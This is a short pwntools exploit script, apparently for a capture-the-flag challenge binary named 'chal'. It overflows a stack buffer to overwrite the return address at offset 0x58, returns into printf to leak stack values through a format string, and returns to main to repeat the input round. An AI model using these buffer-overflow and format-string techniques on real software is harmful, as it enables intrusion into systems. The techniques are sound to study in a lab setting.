from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("./chal")
PRINTF=e.plt['printf']   # 0x4010d4
MAIN=e.symbols['main']   # 0x4012a2
GETS=e.symbols['__gets'] # 0x4011f6

def send_round(p, data):
    p.recvuntil(b">> ")
    p.send(data)

# TEST 1: format string leak via printf(buf). buf must start with 'exit' so main returns to our target.
# ret slot at offset 0x58. Put PRINTF there. buffer contents = 'exit' + fmt + padding.
def build(fmt_after_exit, ret):
    body = b"exit" + fmt_after_exit
    body = body.ljust(0x58, b"A")
    assert b"\x00" not in body, "null in body!"
    return body + p64(ret)

r = remote if False else None

# Local test of printf leak
p = process("./chal")
# round 1: format string, return to printf
fmt = b" %p %p %p %p %p %p %p %p %p %p %p %p"
pay = build(fmt, PRINTF)
send_round(p, pay)
# printf(buf) prints "exit ...leaks...". Then crashes. Read whatever comes out.
data = p.recvall(timeout=3)
print("PRINTF-LEAK round output:")
print(data)
p.close()

# Local test: return to main (loop primitive) -> should print the banner again
p = process("./chal")
pay = build(b"", MAIN)
send_round(p, pay)
import time; time.sleep(0.3)
# after returning to main, it prints banner + ">> " again
try:
    d2 = p.recv(timeout=2)
    print("RET2MAIN output:", d2[:200])
except Exception as ex:
    print("ret2main err", ex)
p.close()
